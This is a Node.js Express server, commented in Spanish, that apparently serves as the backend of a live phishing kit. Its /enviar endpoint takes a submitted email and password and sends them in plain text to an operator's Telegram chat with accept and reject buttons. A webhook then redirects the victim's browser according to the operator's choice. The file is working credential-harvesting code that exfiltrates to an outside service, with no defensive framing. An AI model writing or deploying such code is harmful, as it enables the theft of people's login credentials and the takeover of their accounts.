import dotenv from 'dotenv';
import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { createServer } from 'http';
import { Server } from 'socket.io';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const server = createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

let currentSocket = null;

io.on('connection', (socket) => {
  console.log('🟢 Cliente conectado');
  currentSocket = socket;

  socket.on('disconnect', () => {
    console.log('🔴 Cliente desconectado');
    currentSocket = null;
  });
});

app.post('/enviar', async (req, res) => {
  const { usuario, clave } = req.body;

  const mensaje = `🔐 Nuevo intento de acceso:\n📧 Correo: ${usuario}\n🔑 Contraseña: ${clave}`;

  const opciones = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
      ]
    }
  };

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      ...opciones
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  const { callback_query } = req.body;
  if (!callback_query) return res.sendStatus(200);

  const data = callback_query.data;
  const chat_id = callback_query.from.id;

  let mensaje = '';

  if (data === 'aceptar') {
    console.log('✅ Acceso aprobado!');
    mensaje = '✅ ¡Acceso aprobado!';
    if (currentSocket) {
      currentSocket.emit('redirect', '/bienvenido.html');
    }
  }

  if (data === 'rechazar') {
    console.log('❌ Acceso rechazado!');
    mensaje = '❌ Acceso rechazado.';
    if (currentSocket) {
      currentSocket.emit('redirect', '/denegado.html');
    }
  }

  // Enviar mensaje de confirmación
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id,
      text: mensaje
    })
  });

  // Confirmar el botón
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback_query.id
    })
  });

  res.sendStatus(200);
});

server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
